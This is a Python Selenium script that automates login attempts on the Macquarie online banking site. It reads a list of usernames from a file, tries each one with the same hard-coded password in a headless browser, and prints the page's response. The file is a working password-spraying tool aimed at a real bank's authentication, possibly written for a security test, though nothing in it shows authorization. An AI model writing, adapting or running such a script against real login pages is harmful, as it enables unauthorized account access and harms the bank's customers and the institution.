#!/Users/pramodvijender/PycharmProjects/authentication/venv/chromedriver-Darwin
import time
from sys import argv
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


# Set the path to the Chrome driver executable
#driver_path = '/Users/pramodvijender/Downloads/chromedriver_mac_arm64/chromedriver'

# Create a new instance of the Chrome driver
# make this a headless Browser

driver = webdriver.Chrome()

# Open the website login page
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
chrome_options.add_argument('--enable-javascript')

with open('/Users/pramodvijender/PycharmProjects/authentication/usernames') as myfile:
    for line in myfile.readlines():

         driver = webdriver.Chrome(options=chrome_options)
         driver.get("https://online.macquarie.com.au/personal/#/")
         time.sleep(10)
         wait = WebDriverWait(driver, 1)

# Find the username and password input fields by their HTML attributes
#adding Wait Times until th fields are found
         username_field = wait.until(EC.presence_of_element_located((By.ID, "username")))
         password_field = wait.until(EC.presence_of_element_located((By.ID, "password")))

         login_button = wait.until(EC.presence_of_element_located((By.XPATH, "//*[contains(@class,'btn btn-lg btn-primary btn-block ladda-button')]")))
         print(login_button.id)
# Enter your username and password

         username_field.send_keys(line)
         print(line + "Thi is the username being sent")
         password_field.send_keys("Dig!secTest2023")

# Send the Input Data by Clicking the form
         buttontext = driver.find_element(By.XPATH, "//*[contains(@class,'btn btn-lg btn-primary btn-block ladda-button')]").text
         print(buttontext + " ---This is what the button sees")
         time.sleep(1)

         login_button.click()
#driver.find_element(By.XPATH, "//*[contains(@class,'btn btn-lg btn-primary btn-block ladda-button')]").click()
         print("button clicked")

         time.sleep(1)
# Wait for the login process to complete

         print("Sleeping")
         returntext = driver.find_element(By.XPATH, "//*[contains(@class, 'auth-heading')]").text


# Check if login was successful
#if "Log in unsuccessful" in driver.page_source:
         print(returntext)
#else:

driver.quit()
